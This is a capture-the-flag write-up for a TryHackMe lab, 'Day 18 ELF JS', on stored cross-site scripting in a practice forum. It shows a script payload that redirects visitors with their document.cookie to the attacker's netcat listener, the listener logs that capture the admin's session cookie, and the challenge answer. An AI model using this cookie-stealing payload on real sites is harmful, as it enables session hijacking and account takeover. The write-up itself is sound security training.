# [Day 18] ELF JS

## Instructions

McSkidy knows the crisis isn't over. The best thing to do at this point is OSINT

*we need to learn more about the christmas monster*

During their OSINT, they came across a Hacker Forum. Their research has shown them that this forum belongs to the Christmas Monster. Can they gain access to the admin section of the forum? They haven't made an account yet so make sure to register.

Access the machine at `http://[your-ip-address]:3000` - it may take a few minutes to deploy.

Check out the supporting material [here](https://docs.google.com/document/d/19TJ6ANmM-neOln0cDh7TPMbV9rsLkSDKS3nj0eJaxeg/edit#).

P.S. If you want to learn more about XSS, we have a [room](https://tryhackme.com/room/xss) where you can learn about it in depth.

## #1 - What is the admin's authid cookie value?

### Create an account

First thing first, let's create an account. Connect to http://10.10.4.243:3000 and click on the `Register` link. Create a fake account (`test@test.com`) and then log in using this account.

### Forum

We are guided in the supporting material about what we have to look for. It's about XSS. In our case, it will be a stored XSS. The objective is to store a XSS on the forum, and wait for the admin to log in, to steal his credentials. But there are no real users, right? This is correct, it's a virtual machine. However, we can read this on the formum:

~~~
john:don't write anything sneaky - admin will be coming here from time to time.
~~~

It doesn't give indications on the frequency of the visits from the admin, but as this is a game, we can imagine that it shouldn't be too long.

### Stored XSS

#### Proof of Concept

In javascript, we can get the cookies with `document.cookie`.

The objective is to post a javascript that will redirect the user to our own machine's web server to get the value of the cookie. If you don't have a web server, you can open a socket with netcat, that will listen on port 80/tcp. It won't render any content, but we don't really care, all we want is to steal the cookie.

~~~
$ sudo nc -lnvp 80
~~~

Now that we have our listener, let's post the following content on the forum (replace `**` to match your local tun0 ip):

```javascript
<script>window.location='http://10.9.**.**/?cookie='+document.cookie</script>
```

Immediately, the page reloads and the listener shows the `authid` cookie:

~~~
$ sudo nc -lnvp 80
listening on [any] 80 ...
connect to [10.9.**.**] from (UNKNOWN) [10.9.**.**] 49674
GET /?cookie=authid=9dd22399fb1f4fdacb008d861576680c4d34607b HTTP/1.1
Host: 10.9.**.**
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.70.169:3000/
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
~~~

#### Now for real

The problem now is that we screwed up the forum. Not a real issue, let's begin from start and terminate the machine, deploy a new one. This time though, we will first post the comment, and then we'll open the listener.

After a while, we get the admin's `authid` cookie:

~~~
$ sudo nc -lnvp 80
Listening on [0.0.0.0] (family 0, port 80)
Connection from 10.10.138.108 45766 received!
GET /?cookie=authid=2564799a4e6689972f6d9e1c7b406f87065cbf65 HTTP/1.1
Host: 10.9.35.106
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3844.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://localhost:3000/admin
Accept-Encoding: gzip, deflate
~~~

Answer: `2564799a4e6689972f6d9e1c7b406f87065cbf65`
